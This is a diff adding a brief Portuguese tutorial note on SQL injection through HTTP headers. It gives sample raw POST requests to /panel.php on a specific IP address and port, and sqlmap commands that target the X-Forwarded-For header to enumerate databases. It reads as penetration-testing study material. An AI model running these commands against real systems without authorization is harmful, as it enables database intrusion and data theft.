@@ -1,0 +1,37 @@
+UMA FORMA DE CONSEGUIR FAZER UM SQL INJECTION É POR MEIO DO HEADER DA REQUISIÇÃO ENVIADAS.
+	
+	EXEMPLO DE HEADER:
+		
+		POST /panel.php HTTP/1.1
+		Host: 3.218.38.5:8080
+		Content-Length: 22
+		Cache-Control: max-age=0
+		Content-Type: application/x-www-form-urlencoded
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+		Accept-Encoding: gzip, deflate, br
+	
+	PROCURE POR HEADERS QUE COMECEM COM A LETRA X, EX:
+	X-Forwarded-For.
+	
+	CASO NÃO TENHA, PROCURE POR UNS NA WEB E INSIRA NO HEADER SALVO 
+	EM UM ARQUIVO DE TEXTO E INSERINDO UM VALOR A ELE DE ACORDO
+	COM O QUE ELE FOI FEITO PRA FAZER.
+	
+	EX:
+		POST /panel.php HTTP/1.1
+		Host: 3.218.38.5:8080
+		Content-Length: 22
+		Cache-Control: max-age=0
+		Content-Type: application/x-www-form-urlencoded
+		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+		Accept-Encoding: gzip, deflate, br
+		X-Forwarded-For: 200.200.200.200
+		
+	APÓS SALVAR ISSO EM UM ARQUIVO, USE O SQL MAP PARA TENTAR FAZER A INJEÇÃO.
+	COMANDO: sqlmap -r <arquivo_header.txt> -p <header> --dbs
+	
+	EX: sqlmap -r header.txt -p X-Forwarded-For --dbs
+	
+	O -P É UTILIZADO PARA ESPECIFICAR QUAL O HEADER QUE SERÁ TESTADO PARA SABER SE É VULNERÁVEL OU NÃO AO SQL INJECTION.
+	
+	EXTRA: CASO NÃO ENCONTRE VULNERABILIDADE, VOCÊ PODE TENTAR OUTROS HEADERS, SEGUINDO O MESMO CONCEITO E TESTANDO-OS PARA TALVEZ CONSEGUIR ENCONTRAR UMA VULNERABILIDADE DE SQL INJECTION.
